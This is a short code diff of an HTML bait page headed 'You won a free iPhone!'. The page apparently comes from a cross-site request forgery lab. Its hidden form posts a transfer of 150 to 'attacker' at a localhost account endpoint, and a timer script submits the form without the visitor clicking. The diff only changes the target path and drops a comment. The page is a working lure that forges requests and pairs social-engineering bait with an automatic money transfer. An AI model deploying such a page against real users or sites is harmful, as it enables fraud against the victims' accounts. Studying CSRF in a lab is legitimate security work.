@@ -50,14 +50,13 @@
   <h1>🎉 You won a free iPhone!</h1>
   <p>Click below to claim it:</p>
 
-  <form action="http://localhost:3000/profile-update" method="POST">
+  <form action="http://localhost:3000/account" method="POST">
      <input type="hidden" name="to" value="attacker" />
     <input type="hidden" name="amount" value="150" />
     <button type="submit">Claim Prize</button>
   </form>
 
   <script>
-    // Auto-submit the form after 2 seconds
     setTimeout(() => {
       document.forms[0].submit();
     }, 10000);
